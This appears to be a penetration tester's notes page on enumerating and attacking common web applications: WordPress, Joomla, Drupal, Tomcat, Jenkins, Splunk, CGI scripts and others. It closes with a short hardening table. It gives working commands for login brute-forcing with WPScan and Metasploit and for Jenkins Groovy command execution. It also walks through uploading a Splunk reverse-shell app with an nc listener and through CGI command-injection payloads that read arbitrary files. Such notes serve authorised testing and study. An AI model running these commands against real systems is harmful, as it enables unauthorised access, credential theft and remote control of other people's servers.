+++
title = "🌐 Common Web Applications"
+++

The following sections will detail how to enumerate various web applications, which could lead to exploitation and access.

## EyeWitness

For quick web application discovery.

```bash
# https://github.com/RedSiege/EyeWitness
git clone https://github.com/RedSiege/EyeWitness.git && cd EyeWitness/setup

# cmake is already a part of build-essential
sed -i 's/cmake//gI' ./setup.sh
sudo ./setup.sh
cd ..
source eyewitness-venv/bin/activate

# SCAN using nmap XML results output
python Python/EyeWitness.py --web -d ../scan_eyewitness -x ../<NMAP_XML>
```

## Wordpress

- WPScan: https://github.com/wpscanteam/wpscan
    - API for Vuln DB (free use requires token): https://wpscan.com/api/

WPScan is great, but manual enumeration can also uncover more information sometimes (e.g. certain plugins)

**/robots.txt**
```http
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://<DOMAIN>/wp-sitemap.xml
```

**Folders**
- `/wp-admin`
- `/wp-content`
    - `plugins`: often a source of vulnerabilities
    - `themes`: same
    - scanning for `readme.txt` under these folders can find hidden resources
- `wp-login.php`

**Users**
- **Administrator**: can add and delete users and posts, as well as editing source code
    - leads to RCE!
- **Editor**: can publish and manage all posts
- **Author**: can publish and manage their own posts
- **Contributor**: can write and manage their own posts but not publish
- **Subscriber**: can browse posts and edit their profiles

**Page Source**
```bash
curl -so- 'http://<TARGET>/robots.txt'
curl -s http://<TARGET> | grep -i -e WordPress -e themes -e plugins
```

**WPScan**

- API Token: https://wpscan.com/profile/

```bash
# Generic enumeration
sudo wpscan -t 20 --api-token <API_TOKEN> --url http://<TARGET> --enumerate

# Enumerate all plugins
sudo wpscan -t 20 --api-token <API_TOKEN> --url http://<TARGET> --enumerate ap

# Login brute-force
sudo wpscan -t 20 --url http://<TARGET> --password-attack xmlrpc -U <USER> -P /usr/share/wordlists/rockyou.txt
```

## Joomla

- https://github.com/SamJoan/droopescan
- https://github.com/drego85/JoomlaScan

**/robots.txt**
```http
...
User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

**Page Source**
```bash
curl -s http://<TARGET>/README.txt
curl -s http://<TARGET>/administrator/manifests/files/joomla.xml | xmllint --format -
curl -s http://<TARGET> | grep -i Joomla
```

**Scanning**
```bash
uv tool install git+https://github.com/malmassari/droopescan.git@py3.13-compat --python 3.11

droopescan scan joomla --url http://<TARGET>
```

## Drupal

**Users:**
- `Administrator`: has complete control over the Drupal website.
- `Authenticated User`: can log in to the website and perform operations such as adding and editing articles based on their permissions.
- `Anonymous`: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.

**Page Source**
```bash
curl -s http://<TARGET> | grep -i Drupal

# Version (older Drupals only)
curl -s http://<TARGET> | grep -m2 ""
```

**Scanning**
```bash
uv tool install git+https://github.com/malmassari/droopescan.git@py3.13-compat --python 3.11

droopescan scan drupal --url http://<TARGET>
```

## Tomcat

- `webapps/conf/tomcat-users.xml`: users and creds for management web server manager
- `webapps/manager/WEB-INF/web.xml`: deployment descriptor of the server page routes and classes
- `webapps/manager/WEB-INF/classes/`: contains specific logic and probably sensitive information

**Apache Jserv and Tomcat**
```bash
sudo nmap -sV -p 8009,8080 http://<TARGET>
```

**Page Source**
```bash
curl -s http://<TARGET>/invalid | grep Tomcat 
curl -s http://<TARGET>/docs/ | grep Tomcat 
```

**Find Web Manager Pages `/manager` or `host-manager`**
```bash
feroxbuster -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u http://<TARGET>
```

**Brute-Force Web Manager**
```bash
msfconsole
use auxiliary/scanner/http/tomcat_mgr_login
set rhosts <TARGET>
set VHOST <FQDN>
set RPORT <PORT>
set stop_on_success true
run
```

## Jenkins

**Attach Slave Servers and Tomcat**
```bash
sudo nmap -sV -p 5000,8080 <TARGET>
```

### Script Console

Typically uses Groovy (language) to execute commands:

```groovy
println "cmd.exe /c <COMMAND>".execute().text
```

{{< embed-section page="Docs/5 - Exploitation/shells" header="groovy" >}}

## Splunk

Weak or null authentication are the most likely vectors

**Splunk WebApp**
```bash
sudo nmap -sV -p 8000,8089 <TARGET>
```

**Uploading Callback Shell**
```bash
http://<TARGET>/en-US/app/launcher/home

# Splunk Reverse Shell
git clone https://github.com/0xjpuff/reverse_shell_splunk.git
cd reverse_shell_splunk/reverse_shell_splunk/

# !!! UPDATE !!!
# Change 'attacker_ip_here' and attacker_port_here in the respective script(s)

cd ..
tar -cvzf updater.tar.gz reverse_shell_splunk/

nc -lvnp 8443

# NOTE: uploading the app, causes it run immediately; ensure `nc` is running
# From http://<TARGET>/en-US/manager/search/apps/local > Install app from file
```

## PRTG Network Monitor

**PRTG WebApp**
```bash
sudo nmap -sV -p 80,443,8080 <TARGET>
```

```bash
curl -s http://<TARGET> | grep -i Version
```

## osTicket

For some public facing services, one can acquire a valid, internal email by submitting a ticket, though this might require email activation.

## Gitlab

- Github: https://tillsongalloway.com/finding-sensitive-information-on-github/index.html

## CGI

- Check in:
    - `cgi`
    - `cgi-bin`

```bash
# Overall (though a bit blunt)
feroxbuster -w /usr/share/seclists/Discovery/Web-Content/LEGACY-SERVICES/CGIs/CGIs.txt -u 'http://<TARGET>/'

# Windows
feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x "bat,cmd,exe,vbs,cgi" -u 'http://<TARGET>/cgi/'
feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x "bat,cmd,exe,vbs,cgi" -u 'http://<TARGET>/cgi-bin/'

# Linux
feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x "sh,cgi,pl,py" -u "http://<TARGET>/cgi/"
feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x "sh,cgi,pl,py" -u "http://<TARGET>/cgi-bin/"
```

**NOTE:** any command injection might require URL-encoding of the commands though this can be avoided with `curl`'s option `--data-urlencode`

```bash
# CONFIRM
curl -s --get 'http://<URL>/cgi/welcome.bat' --data-urlencode '& dir'
curl -s --get 'http://<URL>/cgi/welcome.bat' --data-urlencode '& C:\windows\system32\ipconfig.exe'

# File reads ("TACOMAN" is stripped out therefore arbitrary)
curl -s --get 'http://<URL>/cgi/welcome.bat' --data-urlencode '& C:\Windows\System32\find.exe /V "TACOMAN" <FILE>'
```

**Remember** certain commands like `type` or `dir` are internal DOS commands and do not exist as a `.exe` file.

## ColdFusion

- on `TCP/8500` has the following directories:
    - `CFIDE`
    - `cfdocs`


**CF Stack**
```bash
# Mail, HTTP, HTTPS, RPC, Server Monitor, SSL
sudo nmap -sV -p 25,80,443,1935,5500,8500 <TARGET>
```

## IIS

```bash
# HTTP, HTTPS, MSSQL, WinRM, WinRM Secure, Alt Port, Alt Port, Web Deploy
sudo nmap -sV -p 80,443,1433,5985,5986,8000,8080,8172 <TARGET>
```

## LDAP

```bash
sudo nmap -sV -p 389,636 <TARGET>
```

## Harderning

| Application                                                                                                                               | Hardening Category    | Discussion                                                                                                                                                                                                                 |
| ----------------------------------------------------------------------------------------------------------------------------------------- | --------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [WordPress](https://wordpress.org/support/article/hardening-wordpress/)                                                                   | Security monitoring   | Use a security plugin such as [WordFence](https://www.wordfence.com/) which includes security monitoring, blocking of suspicious activity, country blocking, two-factor authentication, and more                           |
| [Joomla](https://docs.joomla.org/Security_Checklist/Joomla!_Setup)                                                                        | Access controls       | A plugin such as [AdminExile](https://extensions.joomla.org/extension/adminexile/) can be used to require a secret key to log in to the Joomla admin page such as `http://joomla.<DOMAIN>/administrator?thisismysecretkey` |
| [Drupal](https://www.drupal.org/docs/security-in-drupal)                                                                                  | Access controls       | Disable, hide, or move the [admin login page](https://www.drupal.org/docs/7/managing-users/hide-user-login)                                                                                                                |
| [Tomcat](https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html)                                                                    | Access controls       | Limit access to the Tomcat Manager and Host-Manager applications to only localhost. If these must be exposed externally, enforce IP whitelisting and set a very strong password and non-standard username.                 |
| [Jenkins](https://www.jenkins.io/doc/book/security/securing-jenkins/)                                                                     | Access controls       | Configure permissions using the [Matrix Authorization Strategy plugin](https://plugins.jenkins.io/matrix-auth)                                                                                                             |
| [Splunk](https://docs.splunk.com/Documentation/Splunk/8.2.2/Security/Hardeningstandards)                                                  | Regular updates       | Make sure to change the default password and ensure that Splunk is properly licensed to enforce authentication                                                                                                             |
| [PRTG Network Monitor](https://helpdesk.paessler.com/en/support/solutions/articles/76000062446-what-security-features-does-prtg-include-) | Secure authentication | Make sure to stay up-to-date and change the default PRTG password                                                                                                                                                          |
| osTicket                                                                                                                                  | Access controls       | Limit access from the internet if possible                                                                                                                                                                                 |
| [GitLab](https://about.gitlab.com/blog/2020/05/20/gitlab-instance-security-best-practices/)                                               | Secure authentication | Enforce sign-up restrictions such as requiring admin approval for new sign-ups, configuring allowed and denied domains                                                                                                     |